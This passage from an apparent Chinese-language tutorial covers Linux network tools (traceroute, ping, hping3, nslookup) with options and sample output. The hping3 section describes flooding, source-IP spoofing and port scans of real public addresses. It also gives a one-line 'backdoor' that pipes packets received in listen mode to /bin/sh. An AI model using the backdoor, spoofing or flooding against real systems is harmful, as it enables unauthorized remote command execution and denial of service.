10  36.110.245.206 (36.110.245.206)  36.928 ms 36.110.247.54 (36.110.247.54)  37.593 ms 36.110.245.82 (36.110.245.82)  41.254 ms
11  36.110.245.161 (36.110.245.161)  33.749 ms *  37.905 ms
12  * * *
13  * * 220.181.182.170 (220.181.182.170)  42.998 ms
14  * * *
15  * * *
16  * * *
17  * * *
18  * * *
19  * * *
20  * * *
21  * * *
22  * * *
23  * * *
24  * * *
25  * * *
26  * * *
27  * * *
28  * * *
29  * * *
30  * * *
</code></pre>
<p>第一行显示要访问的主机名和ip、traceroute将尝试到主机的最大跃点数以及要发送的字节数据包的大小。</p>
<p>每行列出到达目的地的一个跳跃点。给出主机名与主机名的ip，然后是数据包到达主机并返回发起计算机所需的时间。默认情况下，<code>traceroute</code> 为每个主机发送三个数据包，因此列出了三个响应时间。</p>
<p>星号 <code>*</code> 表示丢失的数据包。这意味着网络中断、大量流量导致网络拥塞或防火墙丢弃流量。</p>
<h3 id="追踪ipv6协议">追踪IPv6协议<a hidden class="anchor" aria-hidden="true" href="#追踪ipv6协议">¶</a></h3>
<pre><code class="language-bash">traceroute -6 ipv6.google.com
</code></pre>
<h3 id="忽略主机名与ip的映射">忽略主机名与IP的映射<a hidden class="anchor" aria-hidden="true" href="#忽略主机名与ip的映射">¶</a></h3>
<p>使用-n选项在traceroute中禁用IP地址映射。</p>
<pre><code class="language-bash">traceroute -n qq.com

traceroute to qq.com (183.3.226.35), 30 hops max, 60 byte packets
 1  9.31.61.129  0.908 ms  1.159 ms  1.537 ms
 2  9.31.122.210  1.061 ms  0.837 ms  1.421 ms
</code></pre>
<h3 id="设置相应等待时间">设置相应等待时间<a hidden class="anchor" aria-hidden="true" href="#设置相应等待时间">¶</a></h3>
<p>使用 <code>-w </code> 选项在<code>traceroute</code> 中配置响应等待时间，支持指定等待对探测的响应的时间（秒为单位）。</p>
<pre><code class="language-bash">traceroute -w 1 -n qq.com
</code></pre>
<h3 id="使用特定的网络接口">使用特定的网络接口<a hidden class="anchor" aria-hidden="true" href="#使用特定的网络接口">¶</a></h3>
<p>使用-i选项设置traceroute应使用的网络接口，如果未设置，则根据路由表选择接口。</p>
<pre><code class="language-bash">traceroute -w 1 -n -i eth0 qq.com
</code></pre>
<h2 id="ping">ping<a hidden class="anchor" aria-hidden="true" href="#ping">¶</a></h2>
<p>Ping是一种简单、广泛使用的跨平台网络工具，用于测试主机是否可以在Internet协议（IP）网络上访问。它的工作原理是向目标主机发送网络控制消息协议<strong>Internet Control Message Protocol</strong> (<strong>ICMP</strong>) <strong>ECHO_REQUEST</strong>，目标节点等待并回复 <strong>ECHO_RESPONSE</strong>。</p>
<p>可以使用<code>ping</code> 测试两节点间的网络通信，可以做到：</p>
<ul>
<li>目标主机是否可用，</li>
<li>测量数据包到达目标主机并返回计算机所需的时间（与目标主机通信的往返时间（rtt）），以及数据包丢失的百分比。</li>
</ul>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>iputils-ping</code>  ；<code>apt install iputils-ping</code></li>
<li>CentOS/Fedora: <code>iputils</code> ；<code>yum install -y iputils</code></li>
<li>Apline：<code>iputils </code> ；<code>apk add iputils</code></li>
</ul>
</blockquote>
<p>使用参数</p>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-c</td>
<td>指定发送<strong>ECHO_REQUEST</strong>的请求数</td>
</tr>
<tr>
<td style="text-align:center">-i</td>
<td>设置包与包之间的间隔 <code>ping -i 3 -c 5 www.google.com</code></td>
</tr>
<tr>
<td style="text-align:center">-f</td>
<td>flood ping，检测高负载下的响应，需要有root权限</td>
</tr>
<tr>
<td style="text-align:center">-b</td>
<td>允许ping一个广播地址</td>
</tr>
<tr>
<td style="text-align:center">-t</td>
<td>限制ping遍历的网络跳跃数（TTL <strong>Time-to-live</strong>），收到数据包的每个路由器从计数中至少减去 1，如果大于 0，路由器会将数据包转发到下一跳，否则它会丢弃它并将 ICMP 响应返回。</td>
</tr>
<tr>
<td style="text-align:center">-s</td>
<td>设置ping时的数据包大小（单位 bytes），这将导致提供的总数据包大小加上ICMP头的8个额外字节。</td>
</tr>
<tr>
<td style="text-align:center">-l</td>
<td>发送预加载数据包（先发不等待回复的数据包），大于3需要root权限</td>
</tr>
<tr>
<td style="text-align:center">-W</td>
<td>设置等待相应时间，单位秒</td>
</tr>
<tr>
<td style="text-align:center">-w</td>
<td>设置超时时间，超时退出，单位秒</td>
</tr>
<tr>
<td style="text-align:center">-d</td>
<td>debug模式</td>
</tr>
<tr>
<td style="text-align:center">-v</td>
<td>显示详细输出</td>
</tr>
<tr>
<td style="text-align:center">-A</td>
<td>更快的在两节点间包往返的时间，非特权用户最小为200ms</td>
</tr>
</tbody>
</table>
<h2 id="hping">hping<a hidden class="anchor" aria-hidden="true" href="#hping">¶</a></h2>
<p>hping一个具有可嵌入tcl脚本功能的 <code>TCP/IP</code>包伪造工具。，主要用于创建或生成网络数据包以测试网络、服务或系统性能。 hping 是由不同实体开发的旧工具，并以 <code>hping2</code> 或 <code>hping3</code> 等新版本命名。 在大多数情况下，您可以使用操作系统提供的命令，可以是 hping 或 hping2 或 hping3。 hping 名称源自 ping 命令名称。<code>hping3</code> 是另一种用于扫描网络的工具。它在kali linux中默认是DOS攻击软件之一。</p>
<p>hping支持TCP、UDP、ICMP、raw-IP等协议用于不同的用例。通过使用hping，可以创建具有不同选项的不同协议包。hping主要可以用作。</p>
<ul>
<li>创建原始IP数据包</li>
<li>生成指定数量的数据包</li>
<li>设置包发送间隔</li>
<li>指定传输网络接口</li>
<li>创建和生成TCP数据包</li>
<li>创建和生成UDP数据包</li>
<li>创建和生成IP数据包</li>
<li>创建和生成ICMP数据包</li>
<li>设置MTU值</li>
<li>设置碎片并创建碎片或未碎片的数据包</li>
<li>设置数据包的有效负载或数据大小</li>
</ul>
<p>hping的常用场景</p>
<ul>
<li>模拟DOS和DDOS攻击</li>
<li>测试防火墙和TCP、UDP、IP等协议的防火墙配置</li>
<li>TCP和UDP端口扫描</li>
<li>测试网络设备的配置，如碎片、MTU等。</li>
<li>用于列出中间主机的高级跟踪路由</li>
<li>远程操作系统指纹识别和检测</li>
<li>远程正常运行时间决策</li>
<li>TCP/IP协议实现与栈测试审计</li>
</ul>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>hping3</code>  ；<code>apt install hping3</code></li>
<li>CentOS/Fedora: <code>hping3</code> ；<code>yum install epel-release &amp;&amp; yum install -y hping3</code></li>
<li>Apline：<code>hping3 </code> ；<code>apk add hping3 --update-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing</code></li>
</ul>
</blockquote>
<h3 id="参数说明">参数说明<a hidden class="anchor" aria-hidden="true" href="#参数说明">¶</a></h3>
<p><strong>基础参数</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">参数选项</th>
<th style="text-align:left">参数说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>-c --count [count]</code></td>
<td style="text-align:left">发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑</td>
</tr>
<tr>
<td style="text-align:left"><code>-i --interval  </code></td>
<td style="text-align:left">每个包发送间隔时间(单位是毫秒) 缺省时间是1秒,此功能在增加传输率上很重要。<br> <code>-i 1  </code>  为1s  <br><code>-i u1</code> 为1us （微秒） 即每秒发送1000000包</td>
</tr>
<tr>
<td style="text-align:left"><code>--fast</code></td>
<td style="text-align:left">为 <code> -i u10000</code> 的别名，即1秒发送10个包</td>
</tr>
<tr>
<td style="text-align:left"><code>--faster</code></td>
<td style="text-align:left">为 <code>-i u1</code> 的别名，但实际上发送的包取决于计算机的速度</td>
</tr>
<tr>
<td style="text-align:left"><code> --flood</code></td>
<td style="text-align:left">尽可能快速的发送包，不关注收到的恢复，要比 <code>-i u0</code> 快</td>
</tr>
<tr>
<td style="text-align:left"><code>-I --interface [interface name]</code></td>
<td style="text-align:left">指定默认的路由接口，在linux中，hping3使用默认路由接口。<br/>可以使用 <code>-I</code> 接网络接口的完整名称，如 <code>eth0</code></td>
</tr>
<tr>
<td style="text-align:left"><code>-q -quiet </code></td>
<td style="text-align:left">安静输出。除了启动时和完成时的摘要信息外，不输出任何内容。</td>
</tr>
<tr>
<td style="text-align:left"><code>-n -nmeric</code></td>
<td style="text-align:left">数字化输出主机地址</td>
</tr>
</tbody>
</table>
<p><strong>协议选项</strong></p>
<p>默认情况下，hping使用的为tcp协议</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-0 --rawip</code></td>
<td>原始IP模式，此模式下，hping3将发送IP头。</td>
</tr>
<tr>
<td><code>-1 --icmp</code></td>
<td>ICMP模式，默认情况下hping3将发送ICMP回显请求。</td>
</tr>
<tr>
<td><code>-2 --udp</code></td>
<td>UDP模式，默认情况下，hping3将向目标主机的0端口发送UDP</td>
</tr>
<tr>
<td><code>-8 --scan</code></td>
<td>端口扫描，在该模式下，需要提供一组端口，如 <code>1,2,3</code> 端口组以 <code>,</code> 分隔<br>端口范围：<code>start-end</code>  如 <code>1000-2000</code> <br>特殊字符：<code>all</code> 表示所有端口；<code>know</code> ：包含 <code>/etc/services</code> 中的所有端口<br>组合写法：<code>hping --scan 1-1000,8888,known -S www.baidu.com</code></td>
</tr>
<tr>
<td><code> -9 --listen signature</code></td>
<td>监听模式，此模式下 <code>hping3</code>  等待包含签名的数据包并从签名端转储到数据包的结尾处。</td>
</tr>
</tbody>
</table>
<p><strong>IP相关选项</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-a --spoof hostname</code></td>
<td>此选项可以伪造源IP地址，可确保目标不会获得真实IP地址，必然性的响应将被发送到伪造的地址处。</td>
</tr>
<tr>
<td><code>--rand-source</code></td>
<td>此选项开启随机源模式。hping将发送带有随机源地址的数据包。</td>
</tr>
<tr>
<td><code>--rand-dest</code></td>
<td>此选项开启随机目标模式。hping将数据包发送到随机目标地址<br/>如，当使用随机目标地址时，可以使用<code>x</code> 作为范围，所有出现的 <code>x</code> 都将呗替换为0-255之间的随机数。如<code>10.0.0.x</code>。可以使用<code>--debug</code> 选项查看生成的随机地址。<br/>注意：使用此选项，hping无法检测数据包的正确传出接口，应使用 <code>-I </code>选项指定网络接口。</td>
</tr>
<tr>
<td><code>-t --ttl</code></td>
<td>此选项可以设置传出数据包的TTL（生存时间）</td>
</tr>
<tr>
<td><code>-N id</code></td>
<td>设置IP字段的随机值</td>
</tr>
<tr>
<td><code>-H --ipproto</code></td>
<td>在RAW IP模式中设置IP协议</td>
</tr>
<tr>
<td><code> -r --rel</code></td>
<td>ip id等增量</td>
</tr>
<tr>
<td><code>-m –mtu</code></td>
<td>设置虚拟最大传输单元</td>
</tr>
</tbody>
</table>
<p><strong>icmp选项</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-C --icmptype type</code></td>
<td>设置icmp类型，默认为icmp echo reques。</td>
</tr>
<tr>
<td><code>--icmp-ipver</code></td>
<td>设设置包含在ICMP数据中的IP头的IP版本，默认值为4。</td>
</tr>
<tr>
<td><code>--icmp-ipproto</code></td>
<td>设置包含在ICMP数据中的IP头的IP协议，默认为TCP。</td>
</tr>
</tbody>
</table>
<p><strong>TCP/UDP选项</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-s --baseport [src port]</code></td>
<td>随机源端口</td>
</tr>
<tr>
<td><code>-p --destport [dest port]</code></td>
<td>设置目标端口<br><code>+</code> 目标端口将随着收到的每个回复而增加<br><code>++</code> 目标端口每发送数据包都会增加</td>
</tr>
<tr>
<td>&ndash;keep</td>
<td>保持源端口不边</td>
</tr>
<tr>
<td>-w &ndash;win</td>
<td>设置tcp窗口大小，默认64</td>
</tr>
<tr>
<td>-F &ndash;fin</td>
<td>设置 tcp fin标记</td>
</tr>
<tr>
<td>-S &ndash;syn</td>
<td>设置 tcp SYN标记</td>
</tr>
<tr>
<td>-R &ndash;rst</td>
<td>设置 tcp rst标记</td>
</tr>
<tr>
<td>-P &ndash;push</td>
<td>设置 tcp PUSH标记</td>
</tr>
<tr>
<td>-A &ndash;ack</td>
<td>设置 tcp ACK标记</td>
</tr>
<tr>
<td>-U &ndash;urg</td>
<td>设置 tcp URG标记</td>
</tr>
<tr>
<td>-X &ndash;xmas</td>
<td>设置 tcp Xmas标记</td>
</tr>
<tr>
<td>-Y &ndash;ymas</td>
<td>设置 tcp Ymas标记</td>
</tr>
</tbody>
</table>
<p><strong>常用参数</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-d --data</code></td>
<td>设置数据包主体大小。 <code>使用 --data 40</code> hping将在 protocol_header 增加40 字节。</td>
</tr>
<tr>
<td><code>-E --file [filename]</code></td>
<td>使用文件名内容填充数据包的数据</td>
</tr>
<tr>
<td><code> -j --dump</code></td>
<td>以16进制导出数据包</td>
</tr>
<tr>
<td><code>-J --print</code></td>
<td>导出可打印的数据包</td>
</tr>
<tr>
<td><code>-u --end</code></td>
<td>如果使用 ``&ndash;file filename` 选项，何时为EOF。</td>
</tr>
<tr>
<td><code>-T --traceroute</code></td>
<td>traceroute 模式。此选项将在接收ttl来尝试追踪。</td>
</tr>
<tr>
<td><code>--tr-keep-ttl</code></td>
<td>保持ttl的固定，用于监视某一跳</td>
</tr>
<tr>
<td><code>–tr-stop</code></td>
<td>traceroute 下收到第一个不是ICMP时退出</td>
</tr>
<tr>
<td>&hellip;.</td>
<td></td>
</tr>
</tbody>
</table>
<p><strong>输出格式</strong></p>
<p>hping的一个标准的TCP/UDP格式如下，UDP字段含义与TCP的相同。</p>
<pre><code class="language-bash"># tcp
len=46 ip=192.168.1.1 flags=RA DF seq=0 ttl=255 id=0 win=0 rtt=0.4 ms

# udp
len=46 ip=192.168.1.1 seq=0 ttl=64 id=0 rtt=6.0 ms
</code></pre>
<ul>
<li>len：len是从数据链路层捕获的数据的大小（字节），不包括数据链路头大小。</li>
<li>ip：  ip 为请求的ip</li>
<li>flags：flags为TCP的标记，如
<ul>
<li>R  RESET</li>
<li>S SYN</li>
<li>A  ACK</li>
<li>F FIN</li>
<li>P PUSH</li>
<li>U URGENT</li>
<li>X 不标准的 0x40</li>
<li>Y 不标准的 0x80</li>
</ul>
</li>
<li>seq：seq是数据包的序列号，使用TCP/UDP数据包的源端口获得</li>
<li>id  是IP ID字段。</li>
<li>win  TCP 窗口大小</li>
<li>rtt   往返时间 （round trip time），单位毫秒</li>
<li>以下是使用-V参数后的字段
<ul>
<li>tos 是IP标头的服务类型字段。</li>
<li>iplen ip的总长度</li>
<li>seq 和 ack 是TCP标头中的序列号和32位确认号</li>
<li>是TCP标头校验和值。</li>
<li>urp TCP紧急指针值。</li>
</ul>
</li>
</ul>
<p><strong>ICMP的输出格式</strong></p>
<pre><code class="language-bash">ICMP Port Unreachable from ip=192.168.1.1 name=nano.marmoc.net
</code></pre>
<p>在此格式中，ip 为 ICMP 错误的 IP 地址，name为解析的名称或者为UNKNOWN，而其他的参数含义与TCP/UDP大致相同。</p>
<h3 id="端口扫描">端口扫描<a hidden class="anchor" aria-hidden="true" href="#端口扫描">¶</a></h3>
<p>hping可以自由地创建原始IP、TCP、UDP和ICMP数据包。可以利用此功能生成 <code>TCP SYN</code> 扫描。<code>TCP-SYN</code> 扫描是最简单的将数据包发送到主机/IP端口的方法。这里 扫描的为<code>110.242.68.4:80</code></p>
<p>启动经典的扫描的最简单方法是将TCP-SYN数据包发送到主机/ip上的端口。下面的命令将扫描IP 192.168.8.223上的端口80。从输出中，可以看到 <code>flags=SA</code> SYN和ACK标记，代表一个开放端口。</p>
<pre><code class="language-bash">hping3 -S 110.242.68.4 -p 80 -c 2
</code></pre>
<p>扫描一个范围的端口可以使用 <code>++</code></p>
<pre><code class="language-bash">hping3 -S 110.242.68.4 -p ++80
</code></pre>
<p>也可以使用如下方式</p>
<pre><code class="language-bash">hping3 -8 80-86 -S 110.242.68.4 

Scanning 110.242.68.4 (110.242.68.4), port 80-86
7 ports to scan, use -V to see all the replies
+----+-----------+---------+---+-----+-----+-----+
|port| serv name |  flags  |ttl| id  | win | len |
+----+-----------+---------+---+-----+-----+-----+
   80 http       : .S..A... 128 60936 64240    46
All replies received. Done.
Not responding ports: (81 ) (82 xfer) (83 mit-ml-dev) (84 ctf) (85 ) (86 mfcobol) 
</code></pre>
<h3 id="通过hping3跟踪路由到指定端口">通过Hping3跟踪路由到指定端口：<a hidden class="anchor" aria-hidden="true" href="#通过hping3跟踪路由到指定端口">¶</a></h3>
<p>hping3支持一个很实用功能，可以追踪路由到一个指出的端口，查看你的数据包被阻塞的地方。</p>
<pre><code class="language-bash">hping3 --traceroute -p 80 -V -1 www.google.com

using eth0, addr: 195.133.11.43, MTU: 1500
HPING www.google.com (eth0 142.250.150.104): icmp mode set, 28 headers + 0 data bytes
hop=1 TTL 0 during transit from ip=195.133.10.1 name=gateway   
hop=1 hoprtt=3.1 ms
hop=2 TTL 0 during transit from ip=10.11.12.37 name=UNKNOWN   
hop=2 hoprtt=10.0 ms
hop=3 TTL 0 during transit from ip=62.140.243.62 name=msk-m9-b1-ae30-vlan449.fiord.net
hop=3 hoprtt=1.9 ms
hop=4 TTL 0 during transit from ip=62.140.239.113 name=msk-m9-b6-ae1-vlan12.fiord.net
hop=4 hoprtt=9.8 ms
hop=5 TTL 0 during transit from ip=72.14.222.198 name=UNKNOWN   
hop=5 hoprtt=4.2 ms
hop=6 TTL 0 during transit from ip=108.170.250.33 name=UNKNOWN   
hop=6 hoprtt=3.8 ms
hop=7 TTL 0 during transit from ip=108.170.250.51 name=UNKNOWN   
hop=7 hoprtt=2.5 ms
hop=8 TTL 0 during transit from ip=142.251.49.158 name=UNKNOWN   
hop=8 hoprtt=34.7 ms
hop=9 TTL 0 during transit from ip=108.170.235.204 name=UNKNOWN   
hop=9 hoprtt=18.2 ms
hop=10 TTL 0 during transit from ip=142.250.209.35 name=UNKNOWN   
hop=10 hoprtt=17.1 ms
....
</code></pre>
<h3 id="不同类型的icmp">不同类型的ICMP<a hidden class="anchor" aria-hidden="true" href="#不同类型的icmp">¶</a></h3>
<pre><code class="language-bash">hping3 -c 5 -V -1 -C 17 110.242.68.4 

using eth0, addr: 10.0.0.4, MTU: 1500
HPING 110.242.68.4 (eth0 110.242.68.4): icmp mode set, 28 headers + 0 data bytes

--- 110.242.68.4 hping statistic ---
5 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms
</code></pre>
<p>通过hping3进行TCP FIN扫描</p>
<p>在TCP连接中，FIN标志用于开始请求关闭连接。万一没有得到答复，那说明端口是开放的。通常防火墙会再次发送Rst+ack数据包，以指示该端口已关闭。</p>
<h3 id="通过hping3-进行ack扫描">通过hping3 进行ACK扫描<a hidden class="anchor" aria-hidden="true" href="#通过hping3-进行ack扫描">¶</a></h3>
<p>有些情况下，主机可能禁止PING ICMP，此时使用ACK扫描可以用于检查主机是否处于活动状态。如果主机活跃，会相应RST标记，在hping中是为 <code>flags=R</code>。</p>
<pre><code class="language-bash">hping3 -c 2 -V -p 80 -A 110.242.68.4 

using eth0, addr: 10.0.0.4, MTU: 1500
HPING 110.242.68.4 (eth0 110.242.68.4): A set, 40 headers + 0 data bytes
len=46 ip=110.242.68.4 ttl=128 id=2391 tos=0 iplen=40
sport=80 flags=R seq=0 win=32767 rtt=0.6 ms
seq=1165126080 ack=0 sum=c0ba urp=0
</code></pre>
<h3 id="udp扫描">UDP扫描<a hidden class="anchor" aria-hidden="true" href="#udp扫描">¶</a></h3>
<p>使用参数 <code>-2</code> 可以让hping工作于UDP模式，可以进行UDP扫描</p>
<pre><code class="language-bash">hping3 -2 8.8.4.4 -V -p 53 -c 10
</code></pre>
<h3 id="操作系统识别">操作系统识别<a hidden class="anchor" aria-hidden="true" href="#操作系统识别">¶</a></h3>
<p>使用-Q或-seqnum可以让<code>hping</code> 收集了ISN。</p>
<pre><code class="language-bash">hping3 127.0.0.1 -Q -p 22 -V -S

using lo, addr: 127.0.0.1, MTU: 65536
HPING 127.0.0.1 (lo 127.0.0.1): S set, 40 headers + 0 data bytes
 893247485 +893247485
2568100167 +1674852682
2600543427 +32443260
</code></pre>
<h3 id="内容探测">内容探测<a hidden class="anchor" aria-hidden="true" href="#内容探测">¶</a></h3>
<p>可以使用hping的监听模式，来抓取通过网络接口的所有流量，以及捕获对应的内容。例如抓取通过谷歌搜索的流量包</p>
<pre><code class="language-bash">hping3 -9 &quot;www.google.com&quot; --beep -I eth0hping2 listen mode[main] memlockall(): SuccessWarning: can't disable memory paging!Accept: */*.hk/url?sa=p&amp;hl=zh-CN&amp;pref=hkredirect&amp;pval=yes&amp;q=http://www.google.com.hk/&amp;ust=1624605433464983&amp;usg=AOvVaw2THxd5w15lxgX3_KA19GWLCache-Control: privateContent-Type: text/html; charset=UTF-8P3P: CP=&quot;This is not a P3P policy! See g.co/p3phelp for more info.&quot;Date: Fri, 25 Jun 2021 07:16:43 GMTServer: gwsContent-Length: 370X-XSS-Protection: 0X-Frame-Options: SAMEORIGINSet-Cookie: 1P_JAR=2021-06-25-07; expires=Sun, 25-Jul-2021 07:16:43 GMT; path=/; domain=.google.com; SecureSet-Cookie: NID=217=PdQLBtU-tTavgvb4BW9ouB3nAr1OKNK6I_kn9u2Qa2eTgLA_qLyGv2G_2t2G_PRNVrKu2SOEm-e7ED17ljnx3uFBweBjQWOyRvHrJ6jhC5_J3yaBK0r8mikUrqHNjDez5F3rCleFQDurBEfnqECDFXNkvvO_-Wn4ahGJeid01TM; expires=Sat, 25-Dec-2021 07:16:43 GMT; path=/; domain=.google.com; HttpOnly&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;TITLE&gt;302 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;302 Moved&lt;/H1&gt;The document has moved&lt;A HREF=&quot;http://www.google.com.hk/url?sa=p&amp;amp;hl=zh-CN&amp;amp;pref=hkredirect&amp;amp;pval=yes&amp;amp;q=http://www.google.com.hk/&amp;amp;ust=1624605433464983&amp;amp;usg=AOvVaw2THxd5w15lxgX3_KA19GWL&quot;&gt;here&lt;/A&gt;.&lt;/BODY&gt;&lt;/HTML&gt;.hk/&amp;ust=1624605433464983&amp;usg=AOvVaw2THxd5w15lxgX3_KA19GWL HTTP/1.1User-Agent: curl/7.29.0Host: www.google.com.hkAccept: */*.hk/Cache-Control: privateContent-Type: text/html; charset=UTF-8P3P: CP=&quot;This is not a P3P policy! See g.co/p3phelp for more info.&quot;Date: Fri, 25 Jun 2021 07:16:43 GMTServer: gwsContent-Length: 222X-XSS-Protection: 0Set-Cookie: 1P_JAR=2021-06-25-07; e
</code></pre>
<h3 id="网络后门">网络后门<a hidden class="anchor" aria-hidden="true" href="#网络后门">¶</a></h3>
<p>可以通过hping3的监听模式，创建一个简单的后门(backdoor)，通过管道来执行脚本</p>
<pre><code class="language-bash">hping3 -I eth1 -9 secret | /bin/shhping3 -R 192.168.1.100 -e secret -E commands_file -d 100 -c 1
</code></pre>
<h2 id="nslookup">nslookup<a hidden class="anchor" aria-hidden="true" href="#nslookup">¶</a></h2>
<p><em><strong>nslookup</strong></em>（name server lookup）用于在Linux中执行DNS查找的工具。用于显示DNS详细信息，例如计算机的IP地址、域的MX记录或域的NS服务器。</p>
<p>nslookup 可以在两种模式下运行：交互式和非交互式。交互模式可以查询名称服务器以获取有关各种主机和域的信息或打印域中的主机列表。非交互模式仅打印主机或域的名称和请求的信息。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian:  <code>knot-dnsutils</code>  ；<code>apt install knot-dnsutils</code></li>
<li>CentOS/Fedora: <code>bind-utils</code> | <code>dnsutils</code> ；<code>yum install -y bind-utils</code></li>
<li>Apline：<code>bind-tools </code> ；<code>apk add bind-tools</code></li>
</ul>
</blockquote>
<h3 id="简单查询">简单查询<a hidden class="anchor" aria-hidden="true" href="#简单查询">¶</a></h3>
<p>nslookup后跟域名将显示域名的“A记录”（IP地址）,nslookup命令的默认输出比dig命令的默认输出相对整洁些。</p>
<pre><code class="language-bash">nslookup redhat.com
</code></pre>
<p>执行反向DNS查找：</p>
<pre><code class="language-bash">nslookup 208.117.229.88
</code></pre>
<h3 id="查询mx记录">查询MX记录<a hidden class="anchor" aria-hidden="true" href="#查询mx记录">¶</a></h3>
<p>MX（ Mail Exchange ）记录将域名映射到该域的邮件服务器列表。MX记录表明发到 <code>@qq.com</code> 的所有邮件都应该路由到该域中的邮件服务器。</p>
<pre><code class="language-bash">nslookup -query=mx qq.com

Server:         183.60.83.19
Address:        183.60.83.19#53

Non-authoritative answer:
qq.com  mail exchanger = 20 mx2.qq.com.
qq.com  mail exchanger = 30 mx1.qq.com.
qq.com  mail exchanger = 10 mx3.qq.com.

Authoritative answers can be found from:
</code></pre>
<p>Authoritative Answer与Non-Authoritative Answer</p>
<p>可以注意到注意到上面输出中的关键字 <code>Authoritative</code> 和 <code>Non-Authoritative Answer</code>。任何来自DNS服务器的答复都称为<code>Authoritative Answer</code>，该服务器具有域可用的完整区域文件信息。在许多情况下，DNS服务器将不具备给定域的完整区域文件信息。相反，它维护一个缓存文件，该文件包含过去执行的所有查询的结果，并已获得权威响应。当给出一个DNS查询时，它搜索缓存文件，并以 <code>Non-Authoritative Answer</code> 的形式返回可用的信息。</p>
<h3 id="查询ns记录">查询NS记录<a hidden class="anchor" aria-hidden="true" href="#查询ns记录">¶</a></h3>
<p>NS ( Name Server ) 记录将域名映射到该域的授权DNS服务器列表。它将输出与给定域关联的名称服务。</p>
<pre><code class="language-bash">nslookup -type=ns qq.comServer:         183.60.83.19Address:        183.60.83.19#53Non-authoritative answer:qq.com  nameserver = ns1.qq.com.qq.com  nameserver = ns2.qq.com.qq.com  nameserver = ns3.qq.com.qq.com  nameserver = ns4.qq.com.Authoritative answers can be found from:
</code></pre>
<h3 id="查询soa记录">查询SOA记录<a hidden class="anchor" aria-hidden="true" href="#查询soa记录">¶</a></h3>
<p>SOA ( start of authority )记录\，提供关于域的权威信息、域管理员的电子邮件地址、域序列号等。</p>
<pre><code class="language-bash">nslookup -type=soa qq.com

Server:         183.60.83.19
Address:        183.60.83.19#53

Non-authoritative answer:
qq.com
        origin = ns1.qq.com
        mail addr = webmaster.qq.com
        serial = 1330914143
        refresh = 3600
        retry = 300
        expire = 86400
        minimum = 300

Authoritative answers can be found from:
</code></pre>
<ul>
<li>mail addr–指定域管理员的邮件地址</li>
<li>serial 一种版本编号系统。标准惯例是使用 <code>YYYYMMYNN</code> 格式 <code>2012-07-16.01</code>如果在同一天进行了多个编辑，则将递增）</li>
<li>refresh 指定从DNS服务何时轮询主DNS以查看序列号是否已增加（以秒为单位）。如果增加，从DNS服务器将发出复制新区域文件的新请求。</li>
<li>retry 指定与主DNS重新连接的间隔</li>
<li>expire 指定辅助DNS保持缓存区域文件有效的时间</li>
<li>minimum 指定从DNS应缓存区域文件的时间</li>
</ul>
<h3 id="查看可用的dns记录">查看可用的DNS记录<a hidden class="anchor" aria-hidden="true" href="#查看可用的dns记录">¶</a></h3>
<pre><code class="language-bash">nslookup -type=any qq.com

Server:         183.60.83.19
Address:        183.60.83.19#53

Non-authoritative answer:
Name:   qq.com
Address: 61.129.7.47
Name:   qq.com
Address: 183.3.226.35
Name:   qq.com
Address: 203.205.254.157
Name:   qq.com
Address: 123.151.137.18
qq.com  mail exchanger = 10 mx3.qq.com.
qq.com  mail exchanger = 20 mx2.qq.com.
qq.com  mail exchanger = 30 mx1.qq.com.

Authoritative answers can be found from:
</code></pre>
<h3 id="使用指定dns查询">使用指定DNS查询<a hidden class="anchor" aria-hidden="true" href="#使用指定dns查询">¶</a></h3>
<p>可以指定特定的DNS来解析域名，而不是使用默认DNS进行查询。</p>
<pre><code class="language-bash">nslookup www.qq.com 8.8.8.8

Server:         8.8.8.8
Address:        8.8.8.8#53

Non-authoritative answer:
www.qq.com      canonical name = news.qq.com.edgekey.net.
news.qq.com.edgekey.net canonical name = e6156.dscf.akamaiedge.net.
Name:   e6156.dscf.akamaiedge.net
Address: 23.219.132.75
Name:   e6156.dscf.akamaiedge.net
Address: 2600:1417:76:494::180c
Name:   e6156.dscf.akamaiedge.net
Address: 2600:1417:76:480::180c
</code></pre>
<h3 id="使用特殊的dns端口">使用特殊的dns端口<a hidden class="anchor" aria-hidden="true" href="#使用特殊的dns端口">¶</a></h3>
<p>默认情况下，DNS使用端口号为53。可以使用-port选项指定端口号。</p>
<pre><code class="language-bash">nslookup -port 56 qq.com
</code></pre>
<h3 id="设置超时时间">设置超时时间<a hidden class="anchor" aria-hidden="true" href="#设置超时时间">¶</a></h3>
<p>可以使用 <code>-timeout</code> 选项来指定超时时间</p>
<pre><code class="language-bash">nslookup -timeout=10 qq.com
</code></pre>
<h3 id="启用调试模式">启用调试模式<a hidden class="anchor" aria-hidden="true" href="#启用调试模式">¶</a></h3>
<p><code>-debug</code> 选项打开/关闭调试</p>
<pre><code class="language-bash">nslookup -debug qq.com

Server:         183.60.83.19
Address:        183.60.83.19#53

------------
    QUESTIONS:
        qq.com, type = A, class = IN
    ANSWERS:
    -&gt;  qq.com
        internet address = 183.3.226.35
        ttl = 92
    -&gt;  qq.com
        internet address = 203.205.254.157
        ttl = 92
